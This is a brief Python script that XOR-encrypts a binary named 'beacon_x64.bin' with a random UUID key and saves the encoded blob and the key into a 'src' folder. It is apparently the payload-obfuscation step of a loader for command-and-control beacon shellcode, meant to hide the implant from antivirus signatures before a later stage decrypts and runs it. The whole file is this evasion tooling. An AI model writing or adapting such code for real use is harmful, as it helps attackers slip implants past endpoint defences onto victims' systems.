import uuid

def read_binary_file(file_path):

    try:
        with open(file_path, 'rb') as file:
            data = file.read()
        return data
    except FileNotFoundError:
        print(f"Error: The file {file_path} does not exist.")
        return None

def generate_uuid():
    
    return uuid.uuid4()

def encrypt_with_uuid(data, uuid_key):

    encrypted_data = bytearray()
    uuid_bytes = uuid_key.bytes
    uuid_len = len(uuid_bytes)
    
    for i in range(len(data)):
        encrypted_data.append(data[i] ^ uuid_bytes[i % uuid_len])
    
    return encrypted_data

def save_encrypted_file(file_path, data):
    with open(file_path, 'wb') as file:
        file.write(data)

def save_uuid_to_file(file_path, uuid_key):
    with open(file_path, 'w') as file:
        file.write(str(uuid_key))

def main():
    input_file = 'beacon_x64.bin'
    output_file = 'src/encrypt.bin'
    uuid_file = 'src/uuidkey.txt'
    
    data = read_binary_file(input_file)
    if data is None:
        return

    uuid_key = generate_uuid()
    print(f"Generated UUID key: {uuid_key}")
    
    save_uuid_to_file(uuid_file, uuid_key)
    print(f"UUID key saved to {uuid_file}")
    
    encrypted_data = encrypt_with_uuid(data, uuid_key)
    
    save_encrypted_file(output_file, encrypted_data)
    print(f"Encrypted data saved to {output_file}")

if __name__ == '__main__':
    main()
